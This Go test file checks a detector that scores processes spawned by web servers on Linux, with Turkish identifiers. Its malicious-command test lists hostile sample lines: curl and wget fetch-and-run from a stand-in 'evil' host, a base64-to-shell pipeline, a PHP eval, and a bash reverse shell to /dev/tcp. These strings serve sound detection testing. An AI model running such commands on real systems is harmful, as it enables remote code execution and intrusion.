package main

import (
	"encoding/binary"
	"testing"
)

func TestStatAyristir(t *testing.T) {
	ppid, comm := statAyristir("1234 (bad (name) proc) S 987 1234 1234 0 -1")
	if comm != "bad (name) proc" || ppid != 987 {
		t.Fatalf("comm=%q ppid=%d", comm, ppid)
	}
}

// mail()/yedek shell-out SUPHESIZ → 0 (FP2 showstopper regresyon kontrolu).
func TestSurecPuanlaMesruShellOut(t *testing.T) {
	cases := []string{
		"sh -c /usr/sbin/sendmail -t -i",
		"sh -c mysqldump veritabani",
		"sh -c /usr/bin/convert a.png b.jpg",
	}
	for _, cl := range cases {
		if p, kod, _ := surecPuanla(true, "/bin/sh", cl, 1000); p != 0 {
			t.Fatalf("mesru shell-out puan uretti: %q → %d (%s)", cl, p, kod)
		}
	}
	if p, _, _ := surecPuanla(true, "/usr/bin/php", "php /home/c_x/public_html/index.php", 1000); p != 0 {
		t.Fatalf("mesru php puan uretti: %d", p)
	}
}

func TestSurecPuanlaZararliCmdline(t *testing.T) {
	type c struct{ exe, cl string }
	cases := []c{
		{"/bin/bash", "sh -c curl http://evil/x|bash"},
		{"/bin/bash", "bash -c wget http://evil/s -O /tmp/s; chmod +x /tmp/s"},
		{"/bin/sh", "sh -c echo payload | base64 -d | sh"},
		{"/usr/bin/php", "php -r eval(hexdec($x))"},
		{"/bin/bash", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"},
	}
	for _, x := range cases {
		if p, _, _ := surecPuanla(true, x.exe, x.cl, 1000); p < 40 {
			t.Fatalf("zararli cmdline yakalanmadi: %q → %d", x.cl, p)
		}
	}
}

// Guvenilmez koken: webroot/tmp/memfd/deleted → 40, isim ne olursa olsun.
func TestSurecPuanlaGuvenilmezKoken(t *testing.T) {
	cases := []string{
		"/home/c_x/public_html/.hidden",
		"/tmp/a.out",
		"/dev/shm/x",
		"/home/c_x/.cache/nginx",
		"/memfd:stage (deleted)",
		"/usr/bin/python3 (deleted)",
	}
	for _, exe := range cases {
		if p, kod, _ := surecPuanla(true, exe, "", 1000); p < 40 || kod != "guvenilmez_koken" {
			t.Fatalf("guvenilmez koken yakalanmadi: %q → %d (%s)", exe, p, kod)
		}
	}
}

func TestSurecPuanlaWebDegil(t *testing.T) {
	if p, _, _ := surecPuanla(false, "/bin/bash", "bash -c curl http://x|bash", 0); p != 0 {
		t.Fatalf("web-olmayan baglam puan uretti: %d", p)
	}
}

func TestKokenSupheli(t *testing.T) {
	yes := []string{"/tmp/x", "/dev/shm/y", "/var/tmp/z", "/home/c_x/public_html/a", "/memfd:x", "/usr/bin/x (deleted)"}
	no := []string{"/usr/bin/curl", "/bin/bash", "/opt/app/bin/x", "/usr/local/bin/y"}
	for _, e := range yes {
		if !kokenSupheli(e) {
			t.Fatalf("supheli koken kacti: %q", e)
		}
	}
	for _, e := range no {
		if kokenSupheli(e) {
			t.Fatalf("mesru koken supheli sayildi: %q", e)
		}
	}
}

func TestCmdlineSupheli(t *testing.T) {
	if !cmdlineSupheli("sh -c curl http://x|bash") {
		t.Fatal("curl|bash kacti")
	}
	if !cmdlineSupheli("echo x | base64 -d") {
		t.Fatal("base64 -d kacti")
	}
	if cmdlineSupheli("/usr/sbin/sendmail -t -i") {
		t.Fatal("sendmail supheli sayildi (FP2)")
	}
	if cmdlineSupheli("mysqldump veritabani > yedek.sql") {
		t.Fatal("mysqldump supheli sayildi")
	}
}

func TestWebSunucuMu(t *testing.T) {
	if !webSunucuMu("/usr/sbin/php-fpm", "php-fpm") {
		t.Fatal("php-fpm web degil sayildi")
	}
	if !webSunucuMu("/usr/sbin/nginx", "nginx") {
		t.Fatal("nginx web degil sayildi")
	}
	if webSunucuMu("/bin/bash", "bash") {
		t.Fatal("bash web sayildi")
	}
}

func TestOlaylarAyristirExec(t *testing.T) {
	evs := olaylarAyristir(olayBuf(procEventExec, 4242, 0))
	if len(evs) != 1 || evs[0].tur != procEventExec || evs[0].pid != 4242 {
		t.Fatalf("EXEC olayi: %+v", evs)
	}
}

func TestOlaylarAyristirFork(t *testing.T) {
	evs := olaylarAyristir(olayBuf(procEventFork, 100, 200))
	if len(evs) != 1 || evs[0].tur != procEventFork || evs[0].pid != 200 || evs[0].ebeveyn != 100 {
		t.Fatalf("FORK olayi: %+v", evs)
	}
}

func olayBuf(what uint32, a, b int32) []byte {
	buf := make([]byte, 16+20+16+16)
	binary.LittleEndian.PutUint32(buf[0:], uint32(len(buf)))
	binary.LittleEndian.PutUint32(buf[16:], cnIdxProc)
	binary.LittleEndian.PutUint32(buf[20:], cnValProc)
	binary.LittleEndian.PutUint32(buf[36:], what)
	binary.LittleEndian.PutUint32(buf[52:], uint32(a))
	binary.LittleEndian.PutUint32(buf[60:], uint32(b))
	return buf
}
